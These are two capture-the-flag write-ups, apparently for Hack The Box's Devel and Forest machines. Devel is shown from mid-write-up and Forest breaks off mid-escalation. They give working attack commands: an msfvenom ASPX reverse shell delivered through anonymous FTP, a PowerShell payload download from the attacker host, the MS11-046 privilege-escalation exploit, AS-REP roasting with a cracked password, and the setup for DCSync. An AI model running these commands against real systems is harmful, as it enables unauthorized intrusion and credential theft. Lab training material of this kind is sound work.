Before we start investigating the open ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.5
```

We get back the same results as above.

![](https://miro.medium.com/max/1016/1*hDG9Vpke4PTu-qHcqiFgyQ.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -oA nmap/udp 10.10.10.5
```

We get back the following result. As can be seen, the top 1000 ports are closed.

![](https://miro.medium.com/max/962/1*RSpSTc-uhdKgeG4AkBYE9g.png)

Our only avenue of attack is port 80 & port 21. The nmap scan did show that FTP allowed anonymous logins and so we’ll start there.

## Enumeration <a id="4ace"></a>

Anonymous File Transfer Protocol \(FTP\) allow anyone to log into the FTP server with the username “anonymous” and any password to access the files on the server.

Since anonymous login is supported, let’s log into the ftp server using the “anonymous” username and any password.

![](https://miro.medium.com/max/876/1*WBX7Z9_cACpzZ4Wt_E8ssg.png)

Okay, we’re in! Let’s view the files in the current directory.

![](https://miro.medium.com/max/800/1*0w9cHvVn0yDPHnSlRzKfjg.png)

Try navigating to these files in the browser.

![](https://miro.medium.com/max/1043/1*lGveH44s5a0Gxbsin4swiw.png)

The FTP server seems to be in the same root as the HTTP server. Why is that interesting? Well, if I upload a reverse shell in the FTP server, I might be able to run it through the web server.

To test out our theory, we’ll create a test.html file that displays the word “hello”.

![](https://miro.medium.com/max/742/1*2orMgPfOS4FRRk8DaDUDOQ.png)

Upload the file on the ftp server.

![](https://miro.medium.com/max/706/1*N6lrbk0Z5Bi4naBv1MTStw.png)

List the files in the directory to confirm that the file has been uploaded.

![](https://miro.medium.com/max/652/1*hIaJ5PwS9aHl7YK2xLDmWQ.png)

In the web browser, check if the test.html file is rendered in the web server.

![](https://miro.medium.com/max/571/1*lmTo521jt20qY7YmUILPPg.png)

Alright! This confirms that if we upload a file in the ftp server, and call it in the browser it will get executed by the web server. Our nmap scan showed that the web server is Microsoft IIS version 7.5. IIS web server generally either executes ASP or ASPX \(ASP.NET\). Since the version is 7.5, further googling tells us that it likely supports ASPX.

## Gaining a Foothold <a id="4ff1"></a>

Let’s use MSFvenom to generate our reverse shell. MSFvenom is a framework that is largely used for payload generation. To display the format of payloads it supports, run the following command.

```text
msfvenom --list formats
```

The output shows that aspx is one of the options. Similarly, you can check the payload options with the following command. Since the machine we’re working with is Windows, we filter out the results to only show us Windows payloads.

```text
msfvenom --list payloads | grep windows
```

We’ll go with the general reverse shell since Meterpreter is not allowed in the OSCP.

Run the following MSFvenom command to generate the aspx payload.

```text
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.30 LPORT=4444 -o reverse-shell.aspx
```

* **-p**: payload
* **-f**: format
* **LHOST**: attack machine’s \(kali\) IP address
* **LPORT**: the port you want to send the reverse shell across
* **-o**: where to save the payload

Then, we’ll upload the generated payload on the FTP server and confirm that it has been uploaded.

![](https://miro.medium.com/max/570/1*UpIYJPkkjtTKyMy76-QgWA.png)

Start a netcat listener on the attack machine to receive the reverse shell when it’s executed.

```text

nc -nlvp 4444
```

In the web browser load the **reverse-shell.aspx** file we uploaded in the FTP server.

![](https://miro.medium.com/max/621/1*JKtD5A0GdBOUFjQMaKBQOQ.png)

Go back to your listener to see if the shell connected back.

![](https://miro.medium.com/max/680/1*DEMXPJVemBsr7MHG5otCYg.png)

Perfect! We have a shell and it’s running as **iis apppool\web**.

Change the directory to the **Users** directory where the flags are stored.

![](https://miro.medium.com/max/614/1*X4TMt5gf3wUt4Sl_c40MTA.png)

Try to access the **babis** and **Administrator** user directories.

![](https://miro.medium.com/max/476/1*hDwUXi_qY8cpGaOrYIrsGA.png)

We don’t have permission, so let’s learn more about the operating system to see if we can escalate privileges.

```text
systeminfo
```

The above command returns information about the system.

![](https://miro.medium.com/max/961/1*kZycn4uaqKbyilQkSSm6dA.png)

We’re on a Microsoft Windows 7 build 7600 system. It’s fairly old and does not seem to have been updated, so it’s probably vulnerable to a bunch of exploits.

## Privilege Escalation <a id="ca7c"></a>

Let’s use google to look for exploits.

![](https://miro.medium.com/max/773/1*3u6nJaYxoyWjmtpSl8SPzw.png)

The first two exploits displayed allow us to escalate privileges. The second exploit \(MS11–046\), has documentation on how to compile the source code, so we’ll go with that one.

Get the **EDB-ID** from the web page, so that we can use it to find the exploit in **searchsploit**.

![](https://miro.medium.com/max/315/1*Jzmov1T7A3yERiX9WILsAQ.png)

Update **searchsploit** to ensure you have all the latest vulnerabilities.

```text
searchsploit -u 
```

Use the **-m** flag to look for the exploit **40564** and copy it to the current directory.

```text
searchsploit -m 40564
```

![](https://miro.medium.com/max/832/1*mP4lC3jgHcAIc3sqyrPE_Q.png)

Now, we need to compile the exploit. The compilation instructions are in the [exploitdb webpage](https://www.exploit-db.com/exploits/40564).

![](https://miro.medium.com/max/768/1*5vBVQwS3cjvosENTY8RbYA.png)

If you don’t have mingw-w64 installed, install it.

```text
apt-get updateapt-get install mingw-w64
```

Compile it using the listed command.

```text
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

Alright, we have a compiled exploit. Now what is left is to transfer the exploit to the target \(Devel\) machine.

Start up a server on the attack \(Kali\) machine.

```text
python -m SimpleHTTPServer 9005
```

Netcat doesn’t seem to be installed on Windows, but powershell is. So, we’ll use it to transfer the file from our server to a directory we can write to.

```text
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.30:9005/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
```

![](https://miro.medium.com/max/708/1*sdyxn2zv_pft4yTbT6CIrQ.png)

The file is now in the Downloads directory. Execute it and check if the exploit worked and escalated our privileges.

![](https://miro.medium.com/max/547/1*xG_P5oPYXh5cMZXV77hVyA.png)

We have system! Navigate to the user.txt file and output its content to get the user flag.

![](https://miro.medium.com/max/536/1*vJKrp8Y06jE5dPdFT--Qqw.png)

![](https://miro.medium.com/max/527/1*yKCg168nfYyt1iD-3WJIeQ.png)

Do the same thing for the root flag.

![](https://miro.medium.com/max/571/1*qVTgrGldoi9jdInDsTIA5g.png)

![](https://miro.medium.com/max/524/1*hs1_0ybfeSnfsSSxPKqdKg.png)

## Lessons Learned <a id="d5ae"></a>

There were essentially two vulnerabilities that allowed us to gain system level access to the machine.

The first vulnerability was insecure configuration of the FTP server that allowed us to gain an initial foothold. Our initial way in was through the anonymous login. Then we found out that the FTP server shared the root directory of the web server. Therefore, when we uploaded a reverse shell in the FTP server, we were able to run it using the browser. This gave us a low privileged shell on the machine.

The user should have done two things to avoid this vulnerability:

1. Disabled anonymous access to the FTP server.
2. If anonymous access was necessary, the user should have configured the FTP server to only allow downloads. This way the attacker would not have been able to upload files.

The second vulnerability was a Windows kernel vulnerability that allowed us to elevate privileges. The user should have updated and patched his system when the vulnerability was publicly disclosed and a security update was made available.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
forest-writeup-w-o-metasploit.md
# Forest Writeup w/o Metasploit

![](https://miro.medium.com/max/595/1*pcB0gCBLtndiQS1e9ZmQsQ.png)

## Reconnaissance <a id="ad59"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
nmapAutomator.sh 10.10.10.161 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.161Host is likely running Windows
---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 21:50 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.161
Host is up (0.092s latency).
Not shown: 940 closed ports, 49 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPsslNmap done: 1 IP address (1 host up) scanned in 13.34 seconds                                                                                                                   
                                                                                                                                                                               
                                                                                                                                                                               
                                                                                                                                                                               
---------------------Starting Nmap Basic Scan---------------------                                                                                                             
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 21:50 EDT                                                                                                                
Nmap scan report for 10.10.10.161
Host is up (0.41s latency).PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-14 02:00:20Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:
|_clock-skew: mean: 2h29m28s, deviation: 4h02m30s, median: 9m27s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-03-13T19:02:43-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-14T02:02:45
|_  start_date: 2020-03-14T01:46:00Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 286.29 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 21:55 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.161
Host is up (0.11s latency).
Not shown: 859 open|filtered ports, 136 closed ports
PORT      STATE SERVICE
123/udp   open  ntp
389/udp   open  ldap
49202/udp open  unknown
49211/udp open  unknown
62154/udp open  unknownNmap done: 1 IP address (1 host up) scanned in 158.32 secondsMaking a script scan on UDP ports: 123, 389, 49202, 49211, 62154
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 21:58 EDT
Nmap scan report for 10.10.10.161
Host is up (0.035s latency).PORT      STATE SERVICE VERSION
123/udp   open  ntp     NTP v3
389/udp   open  ldap    Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
49202/udp open  domain  (generic dns response: SERVFAIL)
49211/udp open  domain  (generic dns response: SERVFAIL)
62154/udp open  domain  (generic dns response: SERVFAIL)

3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.13 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 21:58 EDT
Initiating Parallel DNS resolution of 1 host. at 21:58
Completed Parallel DNS resolution of 1 host. at 21:58, 0.03s elapsed
Initiating SYN Stealth Scan at 21:58
Nmap scan report for 10.10.10.161
Host is up (0.12s latency).
Not shown: 64267 closed ports, 1244 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
49900/tcp open  unknownRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 229.59 seconds
           Raw packets sent: 87563 (3.853MB) | Rcvd: 92820 (3.862MB)Making a script scan on extra ports: 5985, 9389, 47001, 49664, 49665, 49666, 49667, 49671, 49676, 49677, 49684, 49706, 49900
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 22:02 EDT
Nmap scan report for 10.10.10.161
Host is up (0.079s latency).PORT      STATE SERVICE    VERSION
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf     .NET Message Framing
47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc      Microsoft Windows RPC
49665/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49671/tcp open  msrpc      Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc      Microsoft Windows RPC
49684/tcp open  msrpc      Microsoft Windows RPC
49706/tcp open  msrpc      Microsoft Windows RPC
49900/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.59 seconds---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 22:03 EDT
Nmap scan report for 10.10.10.161
Host is up (0.055s latency).PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-14 02:12:56Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49900/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/13%Time=5E6C3B75%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.39 seconds
```

We have 24 ports open.

* **Ports 53, 49202, 49211 & 62154:** running DNS
* **Port 88:** running Microsoft Windows Kerberos
* **Ports 139 & 445:** running SMB
* **Ports 389 & 3268:** running Microsoft Windows Active Directory LDAP
* **Port 464:** running kpasswd5
* **Ports 593 & 49676:** running ncacn\_http
* **Ports 636 & 3269:** running tcpwrapped
* **Port 5985:** running wsman
* **Port 47001:** running winrm
* **Port 9389:** running .NET Message Framing
* **Ports 135, 49664, 49665, 49666, 49667, 49671, 49677, 49684, 49706, 49900:** running Microsoft Windows RPC
* **Port 123:** running NTP

Before we move on to enumeration, let’s make some mental notes about the scan results.

* Since the Kerberos and LDAP services are running, chances are we’re dealing with a Windows Active Directory box.
* The nmap scan leaks the domain and hostname: _htb.local_ and _FOREST.htb.local_. Similarly, the SMB OS nmap scan leaks the operating system: Windows Server 2016 Standard 14393.
* Port 389 is running LDAP. We’ll need to query it for any useful information. Same goes for SMB.
* The WSMan and WinRM services are open. If we find credentials through SMB or LDAP, we can use these services to remotely connect to the box.

## Enumeration <a id="7b0a"></a>

We’ll start off with enumerating LDAP.

**Port 389 LDAP**

Nmap has an NSE script that enumerates LDAP. If you would like to see how to do this manually, refer to the [Lightweight Writeup](https://medium.com/@ranakhalil101/hack-the-box-lightweight-writeup-w-o-metasploit-855a5fcf7b82).

```text
root@kali:~/Desktop/htb/lightweight# locate ldap-search
/usr/share/nmap/scripts/ldap-search.nse
```

Let’s run the script on port 389.

```text
root@kali:~/Desktop/htb/forest# nmap -p 389 --script ldap-search 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 23:27 EDT
Nmap scan report for 10.10.10.161
Host is up (0.045s latency).PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: DC=htb,DC=local
|     dn: DC=htb,DC=local
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=htb,DC=local
|         instanceType: 5
|         whenCreated: 2019/09/18 17:45:49 UTC
|         whenChanged: 2020/03/15 01:20:29 UTC
|         subRefs: DC=ForestDnsZones,DC=htb,DC=local
|         subRefs: DC=DomainDnsZones,DC=htb,DC=local
|         subRefs: CN=Configuration,DC=htb,DC=local
|         uSNCreated: 4099
|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00:\xA3k#YyAJ\xB9Y_\x82h\x9A\x08q
|         uSNChanged: 4285009
|         name: htb
|         objectGUID: dff0c71a-49a9-264b-8c7b-52e3e2cb6eab.....msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMailboxGuid: \xD8\x14\xC5\x13\xFC\xF4pA\x9C\xA8,\xB1\x03\xB5|\xB4
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:797836624526913052927892047252322452711419621
|         msExchUMDtmfMap: lastNameFirstName:6739242777682513052927323243292203259333256342
|         msExchUMDtmfMap: firstNameLastName:6739242777682513052927323243292203259333256342
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE....
```

We get a bunch of results, which I have truncated. Notice that it does leak first names, last names and addresses which are written in [DTMF map format](https://docs.microsoft.com/en-us/exchange/voice-mail-unified-messaging/automatically-answer-and-route-calls/dtmf-interface), which maps letters to their corresponding digits on the telephone keypad. This is obviously reversible. However, before I start writing a script to convert the numbers to letters, I’m going to enumerate other ports to see if I can get names from there.

We’ll run enum4linux which is a tool for enumerating information from Windows and Samba systems. It’s a wrapper around the Samba tools smbclient, rpclient, net and nmblookup. With special configuration, you can even have it query LDAP.

```text
enum4linux 10.10.10.161 > enum4linux-results.txt
```

We get a list of domain users.

```text
[+] Getting domain group memberships:
Group 'Domain Users' (RID: 513) has member: HTB\Administrator
Group 'Domain Users' (RID: 513) has member: HTB\DefaultAccount
Group 'Domain Users' (RID: 513) has member: HTB\krbtgt
Group 'Domain Users' (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
Group 'Domain Users' (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
Group 'Domain Users' (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b
Group 'Domain Users' (RID: 513) has member: HTB\SM_75a538d3025e4db9a
Group 'Domain Users' (RID: 513) has member: HTB\SM_681f53d4942840e18
Group 'Domain Users' (RID: 513) has member: HTB\SM_1b41c9286325456bb
Group 'Domain Users' (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549
Group 'Domain Users' (RID: 513) has member: HTB\SM_7c96b981967141ebb
Group 'Domain Users' (RID: 513) has member: HTB\SM_c75ee099d0a64c91b
Group 'Domain Users' (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc3d7722
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfc9daad
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc0a90c9
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox670628e
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox968e74d
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox6ded678
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox83d6781
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfd87238
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxb01ac64
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox7108a4e
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox0659cc1
Group 'Domain Users' (RID: 513) has member: HTB\sebastien
Group 'Domain Users' (RID: 513) has member: HTB\lucinda
Group 'Domain Users' (RID: 513) has member: HTB\svc-alfresco
Group 'Domain Users' (RID: 513) has member: HTB\andy
Group 'Domain Users' (RID: 513) has member: HTB\mark
Group 'Domain Users' (RID: 513) has member: HTB\santi
Group 'Domain Users' (RID: 513) has member: HTB\rc
Group 'Domain Users' (RID: 513) has member: HTB\ln
```

Take the above usernames and save them in the file _usernames.txt._

```text
root@kali:~/Desktop/htb/forest# cat usernames.txt 
Administrator
DefaultAccount
krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
santi
rc
ln
```

Now I have a bunch of usernames but no passwords. If Kerberos pre-authentication is disabled on any of the above accounts, we can use the [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) impacket script to send __a dummy request for authentication. The Key Distribution Center \(KDC\) will then return a TGT that is encrypted with the user’s password. From there, we can take the encrypted TGT, run it through a password cracker and brute force the user’s password.

When I first did this box, I assumed the Impacket script requires a username as a parameter and therefore ran the script on all the usernames that I found. However, it turns out that you can use the script to output both the vulnerable usernames and their corresponding encrypted TGTs.

```text
GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request
```

We get back the following result.

![](https://miro.medium.com/max/1421/1*hEVdVciXL8Uf8Or5CEqKSA.png)

The Kerberos pre-authentication option has been disabled for the user _svc-alfresco_ and the KDC gave us back a TGT encrypted with the user’s password.

Save the encrypted TGT in the file _hash.txt_.

```text
root@kali:~/Desktop/htb/forest# cat hash.txt                                                                
$krb5asrep$svc-alfresco@HTB:4ca6507622ec86fa1a1c8e6ed6c9070f$670b846a8ba6ee243b9cad85657328fdf5624df615750cf3eeaa364b04ae9225ecaff4cf8994bb71fd4c07c9d406c6c30b1a1f899bde7bb9eb4df3e83fa07fc4405994a1bbd7a9fb6105342f78e5ca1ae8797b136f1eaecebd11eefeec83062b0142081208ef51cc17cbecf1fa7a88fad24aee856a539668fb3b9eae917cb6efb57df72a533f893c715bb0216f63c6df345e66fe66777ecfe98c8b516c905d4a81c7e6a4b5d3a3779ddf1ccad98e062f9bfc40596b24bd7685892f4ce22d44dcbf9aa2594748f81e2b7cc369390fab61d8cc7e5eeb2b987e4e52c9fab5f9a184
```

Crack the password using John the Ripper.

```text
john  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

We get back the following result showing us that it cracked the password.

```text
root@kali:~/Desktop/htb/forest# john --show hash.txt 
$krb5asrep$svc-alfresco@HTB:s3rvice1 password hash cracked, 0 left
```

## Initial Foothold <a id="8fca"></a>

Now that we have the username/password _svc-alfresco/s3rvice_, we’ll use the [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) script to gain an initial foothold on the box. This is only possible because the WinRM and WSMan services are open \(refer to nmap scan\).

```text
evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
```

We get a shell!

![](https://miro.medium.com/max/1110/1*z9cX5m0BZ6YETlAfQZW0HA.png)

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/760/1*DiohUDdApVjdCwjQlOkuIA.png)

## Privilege Escalation <a id="ad2d"></a>

Enumerate the users on the domain.

![](https://miro.medium.com/max/984/1*63pGz3KcZ7d9RPrKJ8lxMA.png)

Enumerate the user account we’re running as.

![](https://miro.medium.com/max/929/1*qkfE3938igExB_1u7c9Eig.png)

The user is part of the _Service Accounts_ group. Let’s run bloodhound to see if there are any exploitable paths.

First, download [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) and setup a python server in the directory it resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, download the executable.

```text
(new-object System.Net.WebClient).DownloadFile('http://10.10.14.45:5555/SharpHound.exe', 'C:\Users\svc-alfresco\Desktop\SharpHound.exe')
```

Then run the program.

```text
./Sharphound.exe
```

This outputs two files.

![](https://miro.medium.com/max/1346/1*ojhjoWq6RMjo7cAvGkbV9A.png)

We need to transfer the ZIP file to our attack machine. To do that, base64 encode the file.

```text
certutil -encode 20200321162811_BloodHound.zip test.txt
```

Then output the base64 encoded file.

```text
type test.txt
```

Copy it and base64 decode it on the attack machine.

```text
echo -n "<base64-encoded-value>" | base64 -d > bloodhound-result.zip
```

Alright, now that we how the zipped file on our attack machine, we need to upload it to BloodHound. If you don’t have BloodHound installed on your machine, use the following command to install it.

```text
apt-get install bloodhound
```

Next, we need to start up the neo4j database.

```text
neo4j console
```

Then run bloodhound.

```text
bloodhound
```

Drag and drop the zipped file into BloodHound. Then set the start node to be the _svc-alfresco_ user.

![](https://miro.medium.com/max/430/1*ZFaurDfOVvpid4vs9Eupaw.png)

Right click on the user and select “_Mark User as Owned_”.

![](https://miro.medium.com/max/478/1*qp1rgNv_-qSoQUg4Rmcdeg.png)

In the _Queries_ tab, select the pre-built query “_Shortest Path from Owned Principals_”.

![](https://miro.medium.com/max/464/1*27gUuo0gnBabPYkrJlukXw.png)

We get back the following result.

![](https://miro.medium.com/max/1329/1*U9yMLsgD9RsAicY5Is1Vsg.png)

From the above figure, we can see that _svc-alfresco_ is a member of the group _Service Accounts_ which is a member of the group _Privileged IT Accounts_, which is a member of _Account Operators_. Moreover, the _Account Operators_ group has _GenericAll_ permissions on the _Exchange Windows Permissions_ group, which has _WriteDacl_ permissions on the domain.

This was a mouthful, so let’s break it down.

* _svc-alfresco_ is not just a member of _Service Accounts_, but is also a member of the groups _Privileged IT Accounts_ and _Account Operators._
* The Account Operators group [grants limited account creation privileges to a user](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators). Therefore, the user _svc-alfresco_ can create other users on the domain.
* The _Account Operators_ group has _GenericAll_ permission on the _Exchange Windows Permissions_ group. This permission essentially gives members full control of the group and therefore allows members to directly modify group membership. Since _svc-alfresco_ is a member of _Account Operators_, he is able to modify the permissions of the _Exchange Windows Permissions_ group.
* The _Exchange Windows Permission_ group has _WriteDacl_ permission on the domain _HTB.LOCAL_. This permission allows members to modify the DACL \(Discretionary Access Control List\) on the domain. We’ll abuse this to grant ourselves DcSync privileges, which will give us the right to perform domain replication and dump all the password hashes from the domain.

Putting all the pieces together, the following is our attack path.

1. Create a user on the domain. This is possible because _svc-alfresco_ is a member of the group _Account Operators_.
2. Add the user to the _Exchange Windows Permission_ group. This is possible because _svc-alfresco_ has _GenericAll_ permissions on the _Exchange Windows Permissions_ group.
3. Give the user DcSync privileges. This is possible because the user is a part of the _Exchange Windows Permissions_ group which has _WriteDacl_ permission on the _htb.local_ domain.
4. Perform a DcSync attack and dump the password hashes of all the users on the domain.
5. Perform a Pass the Hash attack to get access to the administrator’s account.

Alright, let’s get started.

Create a user on the domain.

```text
net user rana password /add /domain
```

Confirm that the user was created.

![](https://miro.medium.com/max/1007/1*ZrthoA1bPAz0OSp5kW4sgg.png)

Add the user to to the _Exchange Windows Permission_ group.

```text
net group "Exchange Windows Permissions" /add rana
```

Confirm that the user was added to the group.

